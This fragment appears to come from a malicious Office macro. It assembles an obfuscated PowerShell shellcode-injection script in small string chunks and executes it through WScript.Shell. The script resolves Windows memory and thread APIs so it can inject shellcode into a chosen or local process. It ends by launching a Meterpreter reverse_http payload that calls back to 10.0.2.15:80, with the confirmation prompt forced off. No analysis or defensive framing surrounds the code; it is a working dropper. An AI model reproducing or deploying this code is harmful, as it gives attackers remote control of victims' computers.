        doHWf = doHWf + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        doHWf = doHWf + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        doHWf = doHWf + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        doHWf = doHWf + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        doHWf = doHWf + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        doHWf = doHWf + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        doHWf = doHWf + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        doHWf = doHWf + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        doHWf = doHWf + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        doHWf = doHWf + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        doHWf = doHWf + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        doHWf = doHWf + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        doHWf = doHWf + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        doHWf = doHWf + "ernel32.dll WriteProcessMemory
        $WriteProce"
        doHWf = doHWf + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        doHWf = doHWf + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        doHWf = doHWf + "()) ([Bool])
        $WriteProcessMemory = [System"
        doHWf = doHWf + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        doHWf = doHWf + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        doHWf = doHWf + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        doHWf = doHWf + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        doHWf = doHWf + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        doHWf = doHWf + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        doHWf = doHWf + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        doHWf = doHWf + "eateRemoteThread = [System.Runtime.InteropServices"
        doHWf = doHWf + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        doHWf = doHWf + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        doHWf = doHWf + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        doHWf = doHWf + " CloseHandle
        $CloseHandleDelegate = Get-De"
        doHWf = doHWf + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        doHWf = doHWf + "le = [System.Runtime.InteropServices.Marshal]::Get"
        doHWf = doHWf + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        doHWf = doHWf + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        doHWf = doHWf + ".ShouldContinue( 'Do you wish to carry out your ev"
        doHWf = doHWf + "il plans?',
                 "Injecting shellcode "
        doHWf = doHWf + "injecting into $((Get-Process -Id $ProcessId).Proc"
        doHWf = doHWf + "essName) ($ProcessId)!" ) )
        {
            "
        doHWf = doHWf + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        doHWf = doHWf + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        doHWf = doHWf + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        doHWf = doHWf + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        doHWf = doHWf + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        doHWf = doHWf + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        doHWf = doHWf + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        doHWf = doHWf + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        doHWf = doHWf + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        doHWf = doHWf + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        doHWf = doHWf + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        doHWf = doHWf + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        doHWf = doHWf + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        doHWf = doHWf + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        doHWf = doHWf + "rocAddress kernel32.dll CreateThread
        $Crea"
        doHWf = doHWf + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        doHWf = doHWf + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        doHWf = doHWf + "IntPtr])
        $CreateThread = [System.Runtime.I"
        doHWf = doHWf + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        doHWf = doHWf + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        doHWf = doHWf + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        doHWf = doHWf + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        doHWf = doHWf + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        doHWf = doHWf + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        doHWf = doHWf + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        doHWf = doHWf + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        doHWf = doHWf + "ForSingleObjectDelegate)
        if ( $Force -or $"
        doHWf = doHWf + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        doHWf = doHWf + " your evil plans?',
                 "Injecting sh"
        doHWf = doHWf + "ellcode into the running PowerShell process!" ) )
"
        doHWf = doHWf + "        {
            Inject-LocalShellcode
      "
        doHWf = doHWf + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        doHWf = doHWf + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        doHWf = doHWf + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(doHWf)
End Function
